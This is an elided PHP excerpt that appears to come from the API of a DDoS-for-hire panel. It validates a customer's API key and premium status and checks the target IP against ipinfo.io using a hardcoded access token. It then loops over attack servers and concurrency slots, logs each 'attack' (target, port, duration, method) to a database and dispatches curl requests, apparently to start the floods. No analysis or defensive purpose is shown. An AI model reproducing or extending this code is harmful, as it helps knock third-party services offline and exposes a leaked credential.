...
if (isset($_GET['key'])) {
    if (!empty($_GET['key'])) {
        $token = htmlentities($user->CheckInput($_GET['key']));
        ...
        if ($token == '0') {
            ...
            echo json_encode(array('status' => 'error', 'message' => 'Invalid API authorization key.'));
            die();
        }
        ...
        if ($method != 'stop' && $method != 'stopall') {
            ...
            if ($checkMethod == '1') {
                ...
                $CheckPremium->execute(array(':token' => $token));
            ...
            if (in_array($methodtype, $layer4types)) {
                ...
                curl_setopt($blacklistcurl, CURLOPT_URL, 'https://ipinfo.io/' . $host . '?token=d8a555307cb084');
                    ...
                    if (empty($errors)) {
                        ...
                        while ($server = $SQLSelectServer->fetch(PDO::FETCH_ASSOC)) {
                            ...
                            for ($x = 1;$x <= $concs;$x++) {
                                ...
                                $InsertLogs = $odb->prepare("INSERT INTO `attacklogs`(`id`, `user`, `target`, `port`, `time`, `method`, `concs`, `stopped`, `servers`, `premium`, `apiattack`, `date`, `datetime`) VALUES (NULL, :user, :target, :port, :time, :method, :concs, '0', :handler, :premium, '1', UNIX_TIMESTAMP(NOW()), :datetime)");
                                $InsertLogs->execute(array(':user' => $userinfo['username'], ':target' => $host, ':port' => $port, ':time' => $time, ':method' => $method, ':concs' => $concs, ':handler' => $handlers, ':premium' => $premiummethod, ':datetime' => $datee));
                                $ch = curl_init();
            ...
            $SelectAttack = $odb->prepare("SELECT * FROM `attacklogs` WHERE `time` + `date` > UNIX_TIMESTAMP() AND `user` = :username AND `target` = :target");
